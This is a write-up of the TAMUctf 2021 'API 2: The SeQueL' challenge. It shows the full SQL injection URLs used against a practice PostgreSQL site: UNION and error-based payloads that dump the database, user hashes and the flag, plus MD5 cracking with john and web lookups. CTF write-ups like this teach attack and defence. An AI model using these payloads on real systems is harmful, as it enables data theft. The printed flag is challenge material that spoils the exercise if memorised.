---
title: "TAMUctf 2021 API 2 : The SeQueL Solution"
slug: "api-2-the-sequel-writeup"
date: "2021-04-26 10:15:00.000000"
author_name: "Javantea"
author_email: "jvoss@altsci.com"
draft: false
toc: false
images:
---

TAMUctf 2021
[API 2 : The SeQueL](https://ctftime.org/task/15810) - 150 points

>    I just made my own SCP collection website. What do you think?

This is a simple SQL injection (SQLi) challenge that taught me some new tricks for SQL injection exploitation. I should have known these already, but that is how these sort of things work.

The website appears to be referencing some sort of fiction with initialism SCP. Since it's sometimes helpful, we search for SCP and find this: [http://www.scpwiki.com/object-classes](http://www.scpwiki.com/object-classes)

Our first SQLi that gives us something interesting using a simple `UNION`:

https://shell.tamuctf.com/problem/50034/?name=Cone%27%20union%20select%20%271%27,%272%27,%273%27,%274%27,%275

Improved SQLi with a valid containment:

https://shell.tamuctf.com/problem/50034/?name=Cone%27%20union%20select%20%271%27,%272%27,%27neutralized%27,%274%27,%275

Improved containment:

https://shell.tamuctf.com/problem/50034/?name=Cone%27%20union%20select%20%271%27,%272%27,%27safe%27,%274%27,%275

Canonical SQLi is wrong because they use a %.

https://shell.tamuctf.com/problem/50034/?name=Cone%27%20or%20id=%271

pq: invalid input syntax for integer: "1%" 

That explains or '1'='1 problem I was having intially because '1' does not equal '1%'.

Now we can do a canonical SQLi:

https://shell.tamuctf.com/problem/50034/?name=Cone%27%20or%20%271%25%27=%271

Success

The website:

```
Codename : Default
ID : 1
SCP Containment : safe
default testing icon


Codename : Teddy
ID : 2
SCP Containment : euclid
To please the teddy, one must offer them a sacrifice of your finest tea


Codename : Traffic Cone #88192
ID : 3
SCP Containment : neutralized
We believe they appear from interdimensional rifts with no clear origin



Codename : Gnomial
ID : 4
SCP Containment : thaumiel
If encountered in the wild do not make eye contact. They only become more aggressive.


Codename : Ą̷̡̺̼̗͉̦̦̝̰̲͍͍͖͚̌̓̅̈͐̀̌̀̾̾͘̚̚̚͘̕d̴̻͓̫̭͎͙̮̲͖̭̖̬̦͉͗͒̈́̉̐͋͗̈́̑̄̉̍͑͘ͅd̸̛̙̮͚̩̦̘̗͛͛̓̂̀́̽̒͂͊́̚i̷̡̫͖͎͖͕͎͋̃̀̅̽̾͋͑̿́́͝͝ṡ̵̲̤̥̲̣͚̥̠̍ơ̸̼̒͊̏̅̀̽̿̊̅̈́͊̃̑̓͂͘ṅ̶̢̡͙̣̝̹͓̯̤͉̌̎͜ͅ
ID : 5
SCP Containment : apollyon
H̵̢̩̺̞̥̮̱̤̗̱̹͓̱͔͕̱̔̂̄̇̑̿̚͝Ė̵͍͔̈̂̑̃́̎̿͊͝͝ͅ ̴̢̛̣̦̽̃̿͠I̵̱͚͕͇̱̮͛͑̋́͐̔̓̑͂͘͠ͅS̷̪̝̲̫̝͙͓͒̇͂̍͗̍͐͜ ̷̪̹͕͙͍̭͎̖̺̘̈́̒̍Ȁ̷͚͇̘͓͓Ḽ̴̢̝̗̥̜̭̹̪͉͎̀̿̽R̴̛̗̾̌̂̌̉͊́͋̏E̷̛͉͍̫͆͂͐̍̏͆͒͊̌̚̕͜͝Ā̶̧̛̛̭̬͎̩̭̬̪̩̦̦͚͙̹̳̅̆͌̑͋̎̄͆̒͜͜ͅD̷̨̼̙̣̲̱͎̘̺͎͕̩͉̳̪̲͉̒̐͌̅͌͂͑͠Y̶̬͚̜̰͕̦̝̝͗͌͂͛́͊̈́̐̽̔͒̔͛͐̕͠ ̷͓͔͓̭̞̏̔́̄̋̍̎̽̎͒̈́́̇̊̕͠͠H̶̦̮̿̍͌̀̂̂͌̚̕Ẽ̶̢̛̦͖̖̪̖̬̜̭̄̎̋̎̄̓͒͌̄͌̽́̈R̷̨̢̡̨̖̩͈͖̺̤̳̜̼̱̭̩̤̈́̄̊̌̐̐̕̕͝ͅE̸̡̡̩͓͓̣̲̜͚̖̊̈́͊͒̓͘͜

```

https://shell.tamuctf.com/problem/50034/?name=A

So I am able to get every one individually and in a list..

From a quick web search I found the `version()` function which I should have known about. This tells us that we're working with PostgreSQL.

https://shell.tamuctf.com/problem/50034/?name=Cone%27%20union%20select%20%271%27,%20%272%27,%20%27safe%27,version(),%275

PostgreSQL 11.11 (Debian 11.11-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit

All SQLi after here is now from this pretty cool SQLi write-up:
https://pulsesecurity.co.nz/articles/postgres-sqli


https://shell.tamuctf.com/problem/50034/?name=Cone%27%20union%20select%20%271%27,%20%272%27,%20%27safe%27,(CASE%20WHEN%20((SELECT%20CAST(CHR(32)||(SELECT%20query_to_xml(%27select%20*%20from%20pg_user%27,true,true,%27%27))%20AS%20NUMERIC)=%271%27))%20THEN%20%27a%27%20ELSE%20%27b%27%20END),%275

pq: invalid input syntax for type numeric: " <row xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <usename>postgres</usename> <usesysid>10</usesysid> <usecreatedb>true</usecreatedb> <usesuper>true</usesuper> <userepl>true</userepl> <usebypassrls>true</usebypassrls> <passwd>********</passwd> <valuntil xsi:nil="true"/> <useconfig xsi:nil="true"/> </row> <row xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <usename>yeetus</usename> <usesysid>16421</usesysid> <usecreatedb>false</usecreatedb> <usesuper>false</usesuper> <userepl>false</userepl> <usebypassrls>false</usebypassrls> <passwd>********</passwd> <valuntil xsi:nil="true"/> <useconfig xsi:nil="true"/> </row> " 

https://shell.tamuctf.com/problem/50034/?name=Cone%27%20union%20select%20%271%27,%20%272%27,%20%27safe%27,(CASE%20WHEN%20((SELECT%20CAST(CHR(32)||(SELECT%20database_to_xml(true,true,%27%27))%20AS%20NUMERIC)=%271%27))%20THEN%20%27a%27%20ELSE%20%27b%27%20END),%275

pq: invalid input syntax for type numeric: " <scpfoundation xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <public> <experiments> <id>1</id> <codename>Default</codename> <containment>safe</containment> <description>default testing icon</description> <img>avatar</img> </experiments> <experiments> <id>2</id> <codename>Teddy</codename> <containment>euclid</containment> <description>To please the teddy, one must offer them a sacrifice of your finest tea</description> <img>teddy</img> </experiments> <experiments> <id>3</id> <codename>Traffic Cone #88192</codename> <containment>neutralized</containment> <description>We believe they appear from interdimensional rifts with no clear origin</description> <img>cone</img> </experiments> <experiments> <id>4</id> <codename>Gnomial</codename> <containment>thaumiel</containment> <description>If encountered in the wild do not make eye contact. They only become more aggressive.</description> <img>gnome</img> </experiments> <experiments> <id>5</id> <codename>Ą̷̡̺̼̗͉̦̦̝̰̲͍͍͖͚̌̓̅̈͐̀̌̀̾̾͘̚̚̚͘̕d̴̻͓̫̭͎͙̮̲͖̭̖̬̦͉͗͒̈́̉̐͋͗̈́̑̄̉̍͑͘ͅd̸̛̙̮͚̩̦̘̗͛͛̓̂̀́̽̒͂͊́̚i̷̡̫͖͎͖͕͎͋̃̀̅̽̾͋͑̿́́͝͝ṡ̵̲̤̥̲̣͚̥̠̍ơ̸̼̒͊̏̅̀̽̿̊̅̈́͊̃̑̓͂͘ṅ̶̢̡͙̣̝̹͓̯̤͉̌̎͜ͅ</codename> <containment>apollyon</containment> <description>H̵̢̩̺̞̥̮̱̤̗̱̹͓̱͔͕̱̔̂̄̇̑̿̚͝Ė̵͍͔̈̂̑̃́̎̿͊͝͝ͅ ̴̢̛̣̦̽̃̿͠I̵̱͚͕͇̱̮͛͑̋́͐̔̓̑͂͘͠ͅS̷̪̝̲̫̝͙͓͒̇͂̍͗̍͐͜ ̷̪̹͕͙͍̭͎̖̺̘̈́̒̍Ȁ̷͚͇̘͓͓Ḽ̴̢̝̗̥̜̭̹̪͉͎̀̿̽R̴̛̗̾̌̂̌̉͊́͋̏E̷̛͉͍̫͆͂͐̍̏͆͒͊̌̚̕͜͝Ā̶̧̛̛̭̬͎̩̭̬̪̩̦̦͚͙̹̳̅̆͌̑͋̎̄͆̒͜͜ͅD̷̨̼̙̣̲̱͎̘̺͎͕̩͉̳̪̲͉̒̐͌̅͌͂͑͠Y̶̬͚̜̰͕̦̝̝͗͌͂͛́͊̈́̐̽̔͒̔͛͐̕͠ ̷͓͔͓̭̞̏̔́̄̋̍̎̽̎͒̈́́̇̊̕͠͠H̶̦̮̿̍͌̀̂̂͌̚̕Ẽ̶̢̛̦͖̖̪̖̬̜̭̄̎̋̎̄̓͒͌̄͌̽́̈R̷̨̢̡̨̖̩͈͖̺̤̳̜̼̱̭̩̤̈́̄̊̌̐̐̕̕͝ͅE̸̡̡̩͓͓̣̲̜͚̖̊̈́͊͒̓͘͜</description> <img>crump</img> </experiments> <users> <id>1</id> <name>glenn</name> <password>9651cbc7c0b5fb1a81f2858a07813c82</password> <status>Making More Challenges</status> </users> <users> <id>2</id> <name>teddy</name> <password>e2ec2b31abe380b989ff057aef66377a</password> <status>PWNing Away</status> </users> <users> <id>3</id> <name>admin</name> <password>gigem{SQL_1nj3ct1ons_c4n_b3_fun}</password> <status>Away on Vacation</status> </users> </public> </scpfoundation> "

We got the solution:

gigem{SQL_1nj3ct1ons_c4n_b3_fun}

We found two extra passwords:
glenn 9651cbc7c0b5fb1a81f2858a07813c82
teddy e2ec2b31abe380b989ff057aef66377a

Let's crack them just in case..

john --format=raw-md5 --rules --wordlist=crack/ai3words_order.txt ~/altsci/tamuctf/sqlpw.txt

No luck. Let's try google.

https://www.google.com/search?client=firefox-b-1-d&q=9651cbc7c0b5fb1a81f2858a07813c82

echo -n 'star trek' |md5sum 
9651cbc7c0b5fb1a81f2858a07813c82  -

The first password for glenn is 'star trek', cool.

https://www.google.com/search?q=e2ec2b31abe380b989ff057aef66377a&client=firefox-b-1-d&sxsrf=ALeKk005ipY2W_BV9BhG7w-HA46hrLO30g%3A1619338481194&ei=8SSFYPqXC4Gv0PEPl76aiAo&oq=e2ec2b31abe380b989ff057aef66377a&gs_lcp=Cgdnd3Mtd2l6EAM6CggjEK4CELADECdQvqMDWJixA2ClswNoAXAAeACAAWOIAekBkgEBNJgBAKABAqABAaoBB2d3cy13aXrIAQHAAQE&sclient=gws-wiz&ved=0ahUKEwi61MT3-ZjwAhWBFzQIHRefBqEQ4dUDCA0&uact=5

echo -n 'teddy bear' |md5sum 
e2ec2b31abe380b989ff057aef66377a  -

The first password for teddy is 'teddy bear', cool.

Change your passwords folks. Don't use simple passphrases.
